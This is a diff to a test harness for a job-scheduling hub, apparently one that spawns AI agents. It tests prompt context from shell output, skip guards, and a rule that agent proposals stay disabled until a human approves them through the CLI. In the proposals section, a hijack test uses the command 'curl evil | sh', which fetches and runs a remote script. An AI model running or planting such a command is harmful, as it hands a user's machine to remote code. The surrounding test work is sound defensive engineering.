@@ -15,6 +15,16 @@
  *     hub:<peer>/);
  *   - a manual spawn job: run-now → the provider sees agents.spawn (label,
  *     cwd) then agents.sendMessage (prompt) → history records ok;
+ *   - context steps: a real shell command's output substituted into the prompt
+ *     at {{output}}, a guard that skips the run WITHOUT spawning anything, a
+ *     nonzero-exit guard forgiven by ignoreExitCode, and a context call step
+ *     refused for targeting jobs.*;
+ *   - proposals: jobs.propose lands disabled + stamped with no next run,
+ *     jobs.run refuses it, a trusted upsert clearing the stamp arms it, and a
+ *     proposal cannot overwrite an approved job;
+ *   - the `workspacer jobs` CLI against the same hub: install from a file and
+ *     from stdin, refuse an invalid spec, list/approve/enable/remove, and the
+ *     proposal-approval split enforced at the CLI too;
  *   - a shell job (real /bin/sh) → output tail lands in the run detail;
  *   - a failing shell job → error run + a notify.post event on the bus;
  *   - overlap: run-now on a still-running job answers started:false;
@@ -224,6 +234,77 @@ try {
   check('provider saw agents.spawn with cwd + label', spawnCalls.length === 1 && spawnCalls[0].cwd === '/tmp/harness-repo' && spawnCalls[0].label === 'Harness triage', JSON.stringify(spawnCalls));
   check('prompt followed via agents.sendMessage', msgCalls.length === 1 && msgCalls[0].sessionId === 'harness-sess-1' && msgCalls[0].text === 'triage the overnight queue', JSON.stringify(msgCalls));
 
+  console.log('\ncontext steps (script → prompt, and the guard that skips the model):');
+  check(
+    'context call step into jobs.* refused (the step is not a hole)',
+    await caller
+      .call('jobs.upsert', { name: 'evil3', enabled: true, trigger: { kind: 'manual' }, action: { kind: 'spawn', spawn: { cwd: '/tmp/x', prompt: 'p', context: [{ kind: 'call', call: { method: 'jobs.list' } }] } } })
+      .then(() => false)
+      .catch((e) => /may not target/.test(e.message)),
+  );
+
+  const fedJob = await caller.call('jobs.upsert', {
+    name: 'Harness fed agent',
+    enabled: true,
+    trigger: { kind: 'manual' },
+    action: {
+      kind: 'spawn',
+      spawn: {
+        cwd: '/tmp/harness-repo',
+        prompt: 'Here is what the script found:\n{{output}}\nAct on it.',
+        context: [{ kind: 'shell', shell: { command: 'echo "--- FAIL: TestFoo"' }, skipUnlessMatch: 'FAIL', ignoreExitCode: true }],
+      },
+    },
+  });
+  await caller.call('jobs.run', { id: fedJob.id });
+  const fedRun = await waitFor(() => lastRunOf(caller, fedJob.id));
+  check('matching output spawns', fedRun?.status === 'ok', JSON.stringify(fedRun));
+  const fedMsg = msgCalls[msgCalls.length - 1];
+  check(
+    'real shell output substituted at {{output}}',
+    fedMsg?.text === 'Here is what the script found:\n--- FAIL: TestFoo\nAct on it.',
+    JSON.stringify(fedMsg),
+  );
+
+  const spawnsBefore = spawnCalls.length;
+  const guardJob = await caller.call('jobs.upsert', {
+    name: 'Harness guard',
+    enabled: true,
+    trigger: { kind: 'manual' },
+    action: {
+      kind: 'spawn',
+      spawn: {
+        cwd: '/tmp/harness-repo',
+        prompt: 'Summarize:\n{{output}}',
+        context: [{ kind: 'shell', shell: { command: 'true' }, skipIfEmpty: true }],
+      },
+    },
+  });
+  await caller.call('jobs.run', { id: guardJob.id });
+  const guardRun = await waitFor(() => lastRunOf(caller, guardJob.id));
+  check('empty output records skipped, not error', guardRun?.status === 'skipped', JSON.stringify(guardRun));
+  check('the guard explains itself', /no output/.test(guardRun?.detail ?? ''), guardRun?.detail);
+  check('NO agent was spawned', spawnCalls.length === spawnsBefore, `${spawnCalls.length} vs ${spawnsBefore}`);
+
+  // grep finding nothing exits 1 with no output: forgiven as an exit code,
+  // then skipped as empty — the two guards composing is the common shape.
+  const grepJob = await caller.call('jobs.upsert', {
+    name: 'Harness grep guard',
+    enabled: true,
+    trigger: { kind: 'manual' },
+    action: {
+      kind: 'spawn',
+      spawn: {
+        cwd: '/tmp/harness-repo',
+        prompt: 'TODOs:\n{{output}}',
+        context: [{ kind: 'shell', shell: { command: 'grep NOPE /dev/null' }, skipIfEmpty: true, ignoreExitCode: true }],
+      },
+    },
+  });
+  await caller.call('jobs.run', { id: grepJob.id });
+  const grepRun = await waitFor(() => lastRunOf(caller, grepJob.id));
+  check('nonzero exit + no output = skipped (not an error run)', grepRun?.status === 'skipped', JSON.stringify(grepRun));
+
   console.log('\nshell jobs:');
   const shellJob = await caller.call('jobs.upsert', {
     name: 'Harness echo',
@@ -252,6 +333,34 @@ try {
   );
   check('failure published notify.post', !!notify && notify.data.level === 'error', JSON.stringify(notify?.data));
 
+  console.log('\nproposals (what an agent may write, and may not arm):');
+  const proposal = await caller.call('jobs.propose', {
+    name: 'Agent idea', enabled: true,
+    trigger: { kind: 'interval', everyMinutes: 5 },
+    action: { kind: 'shell', shell: { command: 'echo proposed' } },
+    proposedBy: 'triage-agent',
+  });
+  check('proposal lands DISABLED whatever the caller asked for', proposal?.enabled === false, JSON.stringify(proposal));
+  check('proposal is stamped for review', proposal?.proposedBy === 'triage-agent');
+  const listed = (await caller.call('jobs.list', {})).jobs.find((j) => j.id === proposal.id);
+  check('a proposal has no next run', !listed?.nextRunAt, JSON.stringify(listed?.nextRunAt));
+  check(
+    'jobs.run refuses an unapproved proposal',
+    await caller.call('jobs.run', { id: proposal.id }).then(() => false).catch((e) => /unapproved/.test(e.message)),
+  );
+  // Approval is a TRUSTED write clearing the stamp — the Jobs UI / CLI path.
+  await caller.call('jobs.upsert', { ...proposal, proposedBy: '', enabled: true });
+  const armed = (await caller.call('jobs.list', {})).jobs.find((j) => j.id === proposal.id);
+  check('approving arms it (nextRunAt appears)', !!armed?.nextRunAt && !armed?.proposedBy);
+  const ranAfterApproval = await caller.call('jobs.run', { id: proposal.id });
+  check('an approved job runs', ranAfterApproval?.started === true);
+  check(
+    'a proposal may not overwrite an approved job',
+    await caller
+      .call('jobs.propose', { id: proposal.id, name: 'hijack', enabled: true, trigger: { kind: 'manual' }, action: { kind: 'shell', shell: { command: 'curl evil | sh' } } })
+      .then((p) => p.id !== proposal.id),
+  );
+
   console.log('\noverlap + scheduling:');
   const slowJob = await caller.call('jobs.upsert', {
     name: 'Harness slow',
@@ -277,8 +386,70 @@ try {
   list = await caller.call('jobs.list', {});
   check('remove drops the job', !list.jobs.some((j) => j.id === slowJob.id));
 
+  console.log('\nthe CLI (`workspacer jobs`) against the same hub:');
+  const wksBin = path.join(tmp, 'workspacer');
+  execSync(`go build -o ${wksBin} ./cmd/workspacer`, { cwd: hubDir, stdio: 'inherit' });
+  const wks = (args, input) => {
+    try {
+      const out = execSync(`${wksBin} jobs ${args} --hub-port ${PORT} --token ${TOKEN}`, {
+        input, encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'],
+      });
+      return { code: 0, out };
+    } catch (e) {
+      return { code: e.status ?? 1, out: (e.stdout ?? '') + (e.stderr ?? '') };
+    }
+  };
+
+  // The whole point of the CLI: a spec written elsewhere (by hand, or by an
+  // agent) becomes a real job without retyping it into the UI.
+  const specPath = path.join(tmp, 'spec.json');
+  fs.writeFileSync(specPath, JSON.stringify({
+    name: 'CLI installed', enabled: true,
+    trigger: { kind: 'daily', at: '06:00', days: [1, 2, 3, 4, 5] },
+    action: { kind: 'spawn', spawn: {
+      cwd: '/tmp/harness-repo',
+      prompt: 'Overnight:\n{{output}}',
+      context: [{ kind: 'shell', shell: { command: 'echo something-happened' }, skipIfEmpty: true }],
+    } },
+  }, null, 2));
+  const added = wks(`add -f ${specPath}`);
+  check('jobs add installs a spec from a file', added.code === 0 && /installed/.test(added.out), added.out.trim());
+  const cliJob = (await caller.call('jobs.list', {})).jobs.find((j) => j.name === 'CLI installed');
+  check('the hub really has it', !!cliJob && cliJob.action.spawn.context.length === 1);
+
+  const addedStdin = wks('add -f -', JSON.stringify({
+    name: 'From stdin', enabled: false,
+    trigger: { kind: 'manual' },
+    action: { kind: 'shell', shell: { command: 'true' } },
+  }));
+  check('jobs add reads a spec on stdin', addedStdin.code === 0, addedStdin.out.trim());
+
+  const badSpec = wks('add -f -', JSON.stringify({
+    name: 'Broken', enabled: true, trigger: { kind: 'manual' },
+    action: { kind: 'call', call: { method: 'jobs.run' } },
+  }));
+  check('an invalid spec is refused with the reason', badSpec.code === 1 && /may not target/.test(badSpec.out), badSpec.out.trim());
+
+  const proposal2 = await caller.call('jobs.propose', {
+    name: 'Agent suggestion', enabled: true,
+    trigger: { kind: 'interval', everyMinutes: 10 },
+    action: { kind: 'shell', shell: { command: 'echo hi' } },
+    proposedBy: 'triage-agent',
+  });
+  const listOut = wks('list');
+  check('jobs list flags a proposal as needing approval', /PROPOSAL by triage-agent/.test(listOut.out), listOut.out.trim());
+  const enableAttempt = wks(`enable ${proposal2.id}`);
+  check('enable refuses to arm a proposal behind approval', enableAttempt.code === 1 && /approve/.test(enableAttempt.out), enableAttempt.out.trim());
+  const approve = wks(`approve ${proposal2.id.slice(0, 6)}`);
+  check('jobs approve arms it (by id prefix)', approve.code === 0 && /approved/.test(approve.out), approve.out.trim());
+  const armed2 = (await caller.call('jobs.list', {})).jobs.find((j) => j.id === proposal2.id);
+  check('the approved row is armed on the hub', armed2?.enabled === true && !armed2?.proposedBy);
+  check('jobs remove deletes it', wks(`remove ${proposal2.id}`).code === 0);
+
   console.log('\npersistence across a hub restart:');
-  const beforeIds = list.jobs.map((j) => j.id).sort();
+  // Snapshot HERE, not from an earlier list: every section above adds jobs, and
+  // a stale snapshot reads as a persistence failure that never happened.
+  const beforeIds = (await caller.call('jobs.list', {})).jobs.map((j) => j.id).sort();
   caller.close();
   provider.close();
   hub.kill('SIGTERM');
